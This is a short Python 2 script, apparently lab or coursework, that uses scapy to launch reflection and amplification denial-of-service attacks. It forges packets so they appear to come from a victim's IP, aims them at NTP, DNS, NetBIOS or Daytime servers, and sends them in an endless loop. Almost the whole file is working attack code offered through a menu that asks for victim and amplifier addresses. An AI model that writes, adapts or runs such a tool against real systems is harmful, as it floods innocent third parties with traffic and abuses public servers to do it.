'''Testing instructions:
        1. Please install scapy library to test the program.
        2. Also, install if there are any required libraries.
        3. I have given 4 options to select from the available types of attack.
                i. NTP attack is on UDP Port 123
                ii.DNS attack is on UDP Port 53
                iii.NetBIOS attack is on UDP port 137
                iv.Day time Protocol attack is on UDP port 13'''


from scapy.all import *


def define_ntp_payload():
        #netios attack
    global victim
    global amp

    payload = IP(dst=amp,src=victim) / UDP(sport=51147, dport=123) / Raw(load="\x17\x00\x03\x01" + "\x00" * 4)
    attack(payload)

def define_daytime_payload():
        #Daytime protocol attack
    global victim
    global amp

    payload = IP(dst=amp,src=victim) / UDP(sport=51147, dport=13) / Raw(load="\x20\x0a\x17\x14")
    attack(payload)


def define_dns_payload():
        #dnsattack
        global victim
        global amp

        # mydns=mypackets[]

        payload = IP(dst=amp,src=victim) / UDP(sport=51147, dport=53) / Raw(load="\x06google\x03com\x00\x00\x01\x00\x01\x00\x00\x07u\x00\x04\xc0\xa8\xa8\x01")
        attack(payload)
def define_netbios_payload():
        # netbios attack

        global victim
        global amp

        payload = IP(dst=amp,src=victim) / UDP(sport=51147, dport=137) / Raw(load="\x80\xf0\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x21\x00\x01")
        attack(payload)

def attack(payload):
        #  Sending spoofed packets to Amplifier

        print "Sending packets to attack amp server \n"
        send(payload, loop=1)


if __name__ == "__main__":
        victim = raw_input("Enter Victim/Spoofed IP address: ")
        amp = raw_input("Enter Amplifier/Target server IP address: ")
        print "1.NTP Attack \n 2.DNS Attack \n 3.NetBIOS Attack \n 4.Daytime Protocol Attack"
        numb = int(input("Select attack type: "))
        if numb == 1:
                define_ntp_payload()
        elif numb == 2:
                define_dns_payload()
        elif numb == 3:
                define_netbios_payload()
        elif numb == 4:
                define_daytime_payload()
        else:
                print"You did not select valid input..."
